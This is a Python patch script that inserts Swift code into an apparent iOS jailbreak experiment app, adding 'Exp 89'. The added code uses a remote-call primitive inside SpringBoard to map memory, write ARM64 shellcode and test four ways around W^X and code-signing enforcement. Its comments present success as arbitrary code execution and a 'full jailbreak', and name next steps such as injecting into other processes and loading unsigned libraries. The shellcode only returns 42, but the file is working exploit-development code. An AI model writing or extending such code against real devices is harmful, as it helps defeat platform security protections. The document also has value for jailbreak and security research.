#!/usr/bin/env python3
"""Add Exp 89 — mmap + shellcode execution in SpringBoard (JIT-style)"""

SWIFT_FILE = r'd:\Backup\Personal\Hp\iPhone\DSPloit\lara\views\root\AMFIExperimentView.swift'

with open(SWIFT_FILE, 'r', encoding='utf-8') as f:
    content = f.read()

# Add button before ④ Test Binary Spawn
button_anchor = '                pathButton(\n                    title: "\u2463 Test Binary Spawn",'
button_idx = content.find(button_anchor)
if button_idx == -1:
    print("ERROR: button anchor not found")
    exit(1)

new_button = '''                pathButton(
                    title: "\u2462k JIT Shellcode (Exp 89)",
                    icon: "memorychip.fill",
                    color: .green,
                    label: "JIT",
                    action: runExp89JIT,
                    needsVerified: false,
                    needsProbe: false
                )

'''
content = content[:button_idx] + new_button + content[button_idx:]

# Add function before Dump amfid
func_anchor = '    // MARK: - Dump amfid binary'
func_idx = content.find(func_anchor)
if func_idx == -1:
    print("ERROR: func anchor not found")
    exit(1)

new_func = r'''    // MARK: - Exp 89: JIT Shellcode Execution

    /// Exp 89: mmap + mprotect + execute shellcode di SpringBoard.
    /// Tidak spawn binary baru — execute code di proses yang sudah trusted.
    /// SpringBoard mungkin punya entitlement dynamic-codesigning.
    private func runExp89JIT() {
        isRunning = true
        runningLabel = "JIT"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "JIT Shellcode (Exp 89)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expJITShellcode(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// mmap anonymous RW → write shellcode → mprotect RX → call function pointer.
    ///
    /// Shellcode: MOV X0, #42; RET (return 42 — proof of execution)
    ///
    /// Jika mprotect(RX) berhasil DAN call return 42:
    ///   → JIT code execution di SpringBoard!
    ///   → Bisa execute arbitrary ARM64 code!
    ///   → FULL JAILBREAK (tanpa perlu spawn binary)!
    ///
    /// Jika mprotect gagal (EPERM):
    ///   → iOS enforce W^X tanpa MAP_JIT entitlement
    ///   → Coba MAP_JIT flag (0x0800)
    private func expJITShellcode(sb: RemoteCall) -> ExperimentResult {
        let expName = "JIT Shellcode (Exp 89)"
        var detail = "Experiment 89: JIT Shellcode in SpringBoard\n"
        detail += "=============================================\n\n"
        detail += "Strategy: mmap RW → write shellcode → mprotect RX → call\n"
        detail += "SpringBoard = trusted, mungkin punya dynamic-codesigning.\n\n"

        let mem = sb.trojanMem

        // Constants
        let PAGE_SIZE: UInt64 = 16384  // 16KB on arm64
        let PROT_READ: UInt64 = 1
        let PROT_WRITE: UInt64 = 2
        let PROT_EXEC: UInt64 = 4
        let MAP_PRIVATE: UInt64 = 0x0002
        let MAP_ANON: UInt64 = 0x1000
        let MAP_JIT: UInt64 = 0x0800
        let MAP_FAILED: UInt64 = UInt64(bitPattern: -1)

        // Shellcode: MOV X0, #42; RET
        // This returns 42 when called as a function
        let shellcode_mov_x0_42: UInt32 = 0xD2800540  // MOV X0, #42
        let shellcode_ret: UInt32 = 0xD65F03C0        // RET

        // ═══ TEST A: mmap RW + mprotect RX (standard JIT) ═══
        detail += "=== Test A: mmap(RW) + mprotect(RX) ===\n"

        // mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
        let mmapA = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                       PROT_READ | PROT_WRITE,
                                       MAP_PRIVATE | MAP_ANON,
                                       UInt64(bitPattern: -1), 0)
        detail += "mmap(RW, PRIVATE|ANON): 0x\(String(format: "%llx", mmapA))\n"

        if mmapA != MAP_FAILED && mmapA != 0 {
            detail += "  \u2705 mmap OK\n"

            // Write shellcode
            sb[mmapA].setValue32(shellcode_mov_x0_42)
            sb[mmapA + 4].setValue32(shellcode_ret)
            detail += "  Wrote shellcode (MOV X0,#42 + RET)\n"

            // mprotect to RX
            let mprotRet = RootExecutor.rcall(sb, "mprotect", mmapA, PAGE_SIZE, PROT_READ | PROT_EXEC)
            let mprotErr = remote_errno(sb)
            detail += "  mprotect(RX): ret=\(mprotRet), errno=\(mprotErr)\n"

            if mprotRet == 0 {
                detail += "  \u2705 mprotect(RX) SUCCESS!\n\n"

                // Call shellcode as function pointer!
                // rcallAddr calls a function pointer directly
                let result = RootExecutor.rcallAddr(sb, mmapA)
                detail += "  CALL shellcode: ret=\(result)\n"

                if result == 42 {
                    detail += "\n\ud83c\udfc6\ud83c\udfc6\ud83c\udfc6 SHELLCODE EXECUTED! Return = 42! \ud83c\udfc6\ud83c\udfc6\ud83c\udfc6\n\n"
                    detail += "JIT CODE EXECUTION IN SPRINGBOARD!\n"
                    detail += "Arbitrary ARM64 code runs in trusted process!\n\n"
                    detail += "FULL JAILBREAK ACHIEVED!\n"
                    detail += "  \u2192 Bisa execute code apapun tanpa spawn binary\n"
                    detail += "  \u2192 Bisa inject ke proses lain via mach ports\n"
                    detail += "  \u2192 Bisa load unsigned dylib via manual mapping\n"
                } else {
                    detail += "  \u26a0\ufe0f Return bukan 42 (got \(result)) \u2014 mungkin crash/abort\n"
                }
            } else {
                detail += "  \u274c mprotect gagal (errno=\(mprotErr))\n"
                if mprotErr == 1 { detail += "  EPERM \u2014 W^X enforced tanpa MAP_JIT\n" }
                if mprotErr == 12 { detail += "  ENOMEM\n" }
            }

            // Cleanup
            RootExecutor.rcall(sb, "munmap", mmapA, PAGE_SIZE)
        } else {
            detail += "  \u274c mmap gagal\n"
        }

        // ═══ TEST B: mmap dengan MAP_JIT flag ═══
        detail += "\n=== Test B: mmap(RW, MAP_JIT) + mprotect(RX) ===\n"
        detail += "MAP_JIT = 0x0800 \u2014 khusus untuk JIT compilation.\n"

        let mmapB = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                       PROT_READ | PROT_WRITE,
                                       MAP_PRIVATE | MAP_ANON | MAP_JIT,
                                       UInt64(bitPattern: -1), 0)
        detail += "mmap(RW, MAP_JIT): 0x\(String(format: "%llx", mmapB))\n"

        if mmapB != MAP_FAILED && mmapB != 0 {
            detail += "  \u2705 mmap MAP_JIT OK!\n"

            // Write shellcode
            sb[mmapB].setValue32(shellcode_mov_x0_42)
            sb[mmapB + 4].setValue32(shellcode_ret)

            // mprotect RX
            let mprotB = RootExecutor.rcall(sb, "mprotect", mmapB, PAGE_SIZE, PROT_READ | PROT_EXEC)
            let mprotBErr = remote_errno(sb)
            detail += "  mprotect(RX): ret=\(mprotB), errno=\(mprotBErr)\n"

            if mprotB == 0 {
                detail += "  \u2705 mprotect(RX) with MAP_JIT SUCCESS!\n"

                let result = RootExecutor.rcallAddr(sb, mmapB)
                detail += "  CALL: ret=\(result)\n"

                if result == 42 {
                    detail += "\n\ud83c\udfc6\ud83c\udfc6\ud83c\udfc6 JIT SHELLCODE EXECUTED! \ud83c\udfc6\ud83c\udfc6\ud83c\udfc6\n"
                    detail += "MAP_JIT + mprotect = arbitrary code execution!\n"
                    detail += "FULL JAILBREAK!\n"
                }
            } else {
                detail += "  \u274c mprotect gagal (errno=\(mprotBErr))\n"
            }

            RootExecutor.rcall(sb, "munmap", mmapB, PAGE_SIZE)
        } else {
            let mmapBErr = remote_errno(sb)
            detail += "  \u274c mmap MAP_JIT gagal (errno=\(mmapBErr))\n"
            if mmapBErr == 1 { detail += "  EPERM \u2014 MAP_JIT butuh entitlement\n" }
        }

        // ═══ TEST C: mmap RWX langsung ═══
        detail += "\n=== Test C: mmap(RWX) langsung ===\n"

        let mmapC = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                       PROT_READ | PROT_WRITE | PROT_EXEC,
                                       MAP_PRIVATE | MAP_ANON,
                                       UInt64(bitPattern: -1), 0)
        detail += "mmap(RWX): 0x\(String(format: "%llx", mmapC))\n"

        if mmapC != MAP_FAILED && mmapC != 0 {
            detail += "  \u2705 mmap RWX OK!\n"

            sb[mmapC].setValue32(shellcode_mov_x0_42)
            sb[mmapC + 4].setValue32(shellcode_ret)

            let result = RootExecutor.rcallAddr(sb, mmapC)
            detail += "  CALL: ret=\(result)\n"

            if result == 42 {
                detail += "\n\ud83c\udfc6\ud83c\udfc6\ud83c\udfc6 RWX SHELLCODE EXECUTED! \ud83c\udfc6\ud83c\udfc6\ud83c\udfc6\n"
                detail += "mmap RWX allowed! No W^X enforcement!\n"
                detail += "FULL JAILBREAK!\n"
            }

            RootExecutor.rcall(sb, "munmap", mmapC, PAGE_SIZE)
        } else {
            let mmapCErr = remote_errno(sb)
            detail += "  \u274c mmap RWX gagal (errno=\(mmapCErr))\n"
        }

        // ═══ TEST D: Pakai pthread_jit_write_protect (iOS 14.5+) ═══
        detail += "\n=== Test D: pthread_jit_write_protect_np ===\n"
        detail += "iOS 14.5+ API untuk toggle W/X pada MAP_JIT pages.\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let pjwp = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                      remote_alloc_str(sb, "pthread_jit_write_protect_np"))
        detail += "pthread_jit_write_protect_np: \(pjwp != 0 ? "available" : "not found")\n"

        if pjwp != 0 && mmapB != MAP_FAILED {
            // Re-mmap with MAP_JIT
            let mmapD = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                           PROT_READ | PROT_WRITE | PROT_EXEC,
                                           MAP_PRIVATE | MAP_ANON | MAP_JIT,
                                           UInt64(bitPattern: -1), 0)
            if mmapD != MAP_FAILED && mmapD != 0 {
                // Disable write protect (enable writing)
                RootExecutor.rcall(sb, "pthread_jit_write_protect_np", 0) // 0 = writable
                sb[mmapD].setValue32(shellcode_mov_x0_42)
                sb[mmapD + 4].setValue32(shellcode_ret)

                // Enable write protect (enable execution)
                RootExecutor.rcall(sb, "pthread_jit_write_protect_np", 1) // 1 = executable

                // sys_icache_invalidate
                let sysIcache = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                                   remote_alloc_str(sb, "sys_icache_invalidate"))
                if sysIcache != 0 {
                    RootExecutor.rcall(sb, "sys_icache_invalidate", mmapD, PAGE_SIZE)
                }

                let result = RootExecutor.rcallAddr(sb, mmapD)
                detail += "  CALL via pthread_jit: ret=\(result)\n"

                if result == 42 {
                    detail += "\n\ud83c\udfc6\ud83c\udfc6\ud83c\udfc6 PTHREAD_JIT SHELLCODE EXECUTED! \ud83c\udfc6\ud83c\udfc6\ud83c\udfc6\n"
                    detail += "FULL JAILBREAK via JIT API!\n"
                }

                RootExecutor.rcall(sb, "munmap", mmapD, PAGE_SIZE)
            }
        }

        // Summary
        detail += "\n=== SUMMARY ===\n"
        let success = detail.contains("\ud83c\udfc6")
        if success {
            detail += "\ud83c\udfc6 ARBITRARY CODE EXECUTION ACHIEVED!\n"
            detail += "Bisa execute ARM64 code apapun di SpringBoard!\n"
        } else {
            detail += "W^X enforced \u2014 tidak bisa execute writable memory.\n"
            detail += "SpringBoard tidak punya dynamic-codesigning entitlement.\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

'''

content = content[:func_idx] + new_func + content[func_idx:]

with open(SWIFT_FILE, 'w', encoding='utf-8') as f:
    f.write(content)

print("OK - added Exp 89 button + implementation")
